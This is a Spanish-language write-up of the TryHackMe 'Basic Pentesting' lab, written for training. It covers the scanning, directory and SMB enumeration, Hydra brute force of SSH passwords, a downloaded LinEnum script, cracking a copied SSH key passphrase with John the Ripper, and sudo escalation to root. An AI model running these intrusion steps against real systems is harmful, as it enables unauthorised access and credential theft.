# Basic Pentesting - TryHackMe

Este es el write-up de la resolución del reto CTF realizado en la máquina `10.10.136.193`. A continuación se detallan las fases de reconocimiento, explotación y escalada de privilegios.

---

## Reconocimiento

### Ping

Realizamos un ping inicial:  

```bash
ping -c 1 10.10.136.193
```
<img width="558" alt="image" src="https://github.com/user-attachments/assets/8e126666-527d-4212-802a-2c99ed8d06f8" />

Se observa un TTL de 63, que indica un sistema operativo Linux.

### Nmap

Ejecutamos un escaneo completo para identificar puertos abiertos:
```bash
nmap -p- -sS -sC -sV --open --min-rate=5000 -n -vvv -Pn 10.10.136.193 -oN escaneo.txt
```
<img width="560" alt="image" src="https://github.com/user-attachments/assets/2608d9ac-d1dd-419a-b98f-a725c55e632c" /><br>

Encontramos el puerto 80 abierto, accedemos a su contenido:

<img width="555" alt="image" src="https://github.com/user-attachments/assets/28465ea0-d47c-49b2-8f67-c7feb85c832d" />

### Dirsearch

Enumeramos directorios en el servidor HTTP:
```bash
dirsearch -u http://10.10.136.193/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
<img width="560" alt="image" src="https://github.com/user-attachments/assets/16f2a291-cca1-4721-8bb4-6c8c6d45c34e" />

Descubrimos el directorio /development y analizamos dos ficheros .txt dentro de él.

Observamos que hay dos usuarios cuyos nombres comienzan con K y J.
Se indica que J tiene una contraseña fácil de romper.

### Protocolo SMB

Enumeramos recursos compartidos con SMB:
```bash
smbclient -L 10.10.136.193 -N
```

Accedemos al recurso Anonymous:
```bash
smbclient //10.10.136.193/Anonymous -N
```

Encontramos el archivo staff.txt, lo descargamos:
```bash
get staff.txt
```
Confirmamos los usuarios: Kay y Jan.

---

## Explotación

### Hydra

Probamos fuerza bruta SSH con Hydra sobre el usuario Jan:
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.136.193
```
Encontramos la contraseña de jan: armando.

Accedemos vía SSH:
```bash
ssh jan@10.10.136.193
```

---

## Escalada de privilegios

### Binarios SUID

Comprobamos binarios con bit SUID:
```bash
find / -perm -4000 2>/dev/null
```

Sospechamos de pkexec vulnerable (pwnkit), pero la máquina parece parcheada y no nos permite explotarlo. Intentamos compilar un exploit, pero falla.

### LinEnum

Descargamos y ejecutamos LinEnum para enumerar vulnerabilidades:
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

Observamos que el usuario kay pertenece al grupo sudo:
```bash
uid=1000(kay) gid=1000(kay) groups=1000(kay),4(adm),24(cdrom),27(sudo),...
```

Lanzamos Hydra nuevamente sobre kay:
```bash
hydra -l kay -P /usr/share/wordlists/rockyou.txt ssh://10.10.136.193
```
Sin éxito. Seguimos investigando.

### Clave SSH y John the Ripper
Dentro de /home/kay encontramos un fichero id_rsa para autenticación SSH. Lo copiamos a nuestra máquina atacante, pero está protegido con passphrase.

Procedemos a crackearlo:

Convertimos al formato John:
```bash
python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
```

Lo rompemos con John:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```
Con la passphrase correcta, accedemos vía SSH como kay.

Leemos el fichero pass.bak que parece contener la contraseña de kay.
Comprobamos privilegios de sudo:
```bash
sudo -l
```
Verificamos que kay tiene permisos sudo sin restricciones. ¡Root conseguido! 🎉

---

## Conclusiones
- Enumeración inicial completa con Nmap y Dirsearch
- Enumeración de recursos SMB para obtener usuarios
- Ataque de fuerza bruta con Hydra para acceso inicial
- Enumeración de privilegios con LinEnum
- Uso de John the Ripper para romper passphrase de clave SSH
- Escalada final con privilegios sudo

